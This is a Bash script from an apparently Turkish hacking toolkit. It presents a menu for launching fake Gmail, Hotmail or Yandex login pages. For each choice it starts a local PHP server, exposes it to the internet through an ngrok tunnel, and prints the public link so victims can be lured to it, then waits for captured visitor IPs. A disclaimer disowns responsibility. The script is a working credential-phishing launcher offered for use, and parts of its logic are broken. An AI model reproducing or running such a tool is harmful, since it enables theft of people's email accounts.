#!/bin/bash
#Code : Yaman Efkar
#Youtube : YamanEfkar
#İnstagram : @turksibertimi
#Bu toolun kullanımında meydana gelicek hiç bir şey sorumluluğumda değildir!Kişi yaptığı tüm işlerden kendisi sorumludur!
#Turk-Sploi-Pluas

banner_mail(){
	clear
	echo -e "\033[31;40;1m

		   \e[36m             Mail
		   \e[32m*******************************
			█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\e[31m
			█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
			█░░║║║╠─║─║─║║║║║╠─░░█
			█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\e[34m
			█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

		   \e[31m[\e[32m01\e[31m]\e[37mGmail	        \e[31m[\e[32m02\e[31m]\e[37mHotmail

		   \e[31m[\e[32m03\e[31m]\e[37mYandex	

		   \e[34m******************************* 

		   \e[31m[\e[32m99\e[31m]\e[37mAna Menü


			"
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_mail

}




don() {

echo -e '\e[31m[\e[32m!\e[31m]\e[37m Hazır !'

while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Adresi Bulunamadı\n"
catch_ip

fi
sleep 1
done

}



	banner_mail


	if [[ $islem_mail == 1 || $islem_mail == 01 ]]; then
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' port	
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 1
	cd gmail/ &&
	php -S 127.0.0.1:$port > /dev/null 2>&1 &
	sleep 2
	ngrok http $port > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don



	elif [[ $islem_mail == 2 || $islem_mail == 02 ]]; then
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' port	
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 1
	cd hotmail/ &&	
	php -S 127.0.0.1:$port > /dev/null 2>&1 &
	sleep 2
	ngrok http $port > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don


	elif [[ $islem_mail == 3 || $islem_mail == 03 ]]; then
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' port	
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 1
	cd yandex/ &&
	php -S 127.0.0.1:$port > /dev/null 2>&1 &
	sleep 2
	ngrok http $port > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don


	elif [[ $islem_mail == 9 || $islem_mail == 99 ]]; then
		bash ../tst.sh

	else
		echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
		sleep 2
		bash mail.sh
	fi
